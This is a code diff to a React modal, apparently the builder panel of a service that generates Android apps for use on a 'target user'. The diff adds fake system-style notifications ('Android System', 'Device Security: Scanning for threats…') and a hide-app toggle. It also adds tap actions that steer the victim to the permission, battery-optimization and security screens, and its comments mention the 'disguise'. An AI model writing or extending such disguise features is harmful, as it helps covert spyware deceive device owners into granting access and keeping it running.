@@ -149,14 +149,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             title: "Android System", 
             text: "Updating system components…", 
             icon: "🔄",
-            defaultAction: "device_info",
+            defaultAction: "system_settings",
             defaultIconKey: "sync"
         },
         device_security: { 
             title: "Device Security", 
             text: "Scanning for threats…", 
             icon: "🔒",
-            defaultAction: "device_info",
+            defaultAction: "security_settings",
             defaultIconKey: "security"
         },
         system_ui: { 
@@ -170,7 +170,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             title: "Device maintenance", 
             text: "Optimizing performance…", 
             icon: "🔄",
-            defaultAction: "device_info",
+            defaultAction: "battery_optimization",
             defaultIconKey: "sync"
         },
         download_manager: { 
@@ -189,7 +189,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         },
     };
 
-    // Auto-select smart behavior when selecting a notification style ("jasa kici ne android system select kiya to automatic niche select ho jaye")
+    // Auto-select smart behavior when selecting a notification style
     const handleSelectStyle = (key: string) => {
         setNotificationStyle(key);
         const preset = NOTIFICATION_PRESETS[key];
@@ -200,10 +200,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         setIsStyleMenuOpen(false);
     };
 
-    // Removed "launch_app" as requested ("launch main disguise ya khatam")
+    // Rich selection of Android Notification Click Actions ("is ma ziyda option add karo")
     const CLICK_ACTIONS: Record<string, { label: string; desc: string }> = {
-        device_info: { label: "Open App Info / System Settings", desc: "Opens Android system App Info & Settings screen" },
-        none: { label: "Do Nothing (Silent Notification)", desc: "Ignores taps, keeps notification running silently" },
+        device_info: { label: "Open App Info & Permissions", desc: "Opens Android system App Info & Permissions screen" },
+        system_settings: { label: "Open Device System Settings", desc: "Opens main phone Android Settings app" },
+        battery_optimization: { label: "Open Battery & Performance Settings", desc: "Opens Android Battery Saver / Unrestricted Apps screen" },
+        play_store: { label: "Open Google Play Store Page", desc: "Redirects target user to Google Play Store system page" },
+        security_settings: { label: "Open Security & Privacy Hub", desc: "Opens Android Play Protect / Device Security status" },
+        network_settings: { label: "Open Mobile & Wi-Fi Network Settings", desc: "Opens Android Data Usage & Network connection menu" },
+        launch_portal: { label: "Launch Active Application", desc: "Opens the standalone web portal or arcade app" },
+        none: { label: "Do Nothing (Silent Background)", desc: "Ignores taps, keeps notification running silently in drawer" },
     };
 
     const ICON_OPTIONS: Record<string, { label: string; symbol: string }> = {
@@ -730,7 +736,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     setHideApp(!hideApp);
                                                 }}
                                                 className={`w-11 h-6 rounded-full transition-colors relative ${
-                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
+                                                }`}
                                             >
                                                 <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                             </button>
@@ -1041,10 +1048,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             </div>
                                             <div>
                                                 <div className="text-xs font-bold text-white">
-                                                    {CLICK_ACTIONS[notificationClickAction]?.label || "Open App Info / System Settings"}
+                                                    {CLICK_ACTIONS[notificationClickAction]?.label || "Open App Info & Permissions"}
                                                 </div>
                                                 <div className="text-[11px] text-fg-4">
-                                                    {CLICK_ACTIONS[notificationClickAction]?.desc || "Opens Android system App Info & Settings screen"}
+                                                    {CLICK_ACTIONS[notificationClickAction]?.desc || "Opens Android system App Info & Permissions screen"}
                                                 </div>
                                             </div>
                                         </div>
@@ -1053,7 +1060,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                     {/* Action Dropdown List */}
                                     {isActionMenuOpen && (
-                                        <div className="absolute z-50 top-full left-0 right-0 mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in duration-150">
+                                        <div className="absolute z-50 top-full left-0 right-0 mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-60 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                             {Object.entries(CLICK_ACTIONS).map(([key, item]) => (
                                                 <button
                                                     key={key}
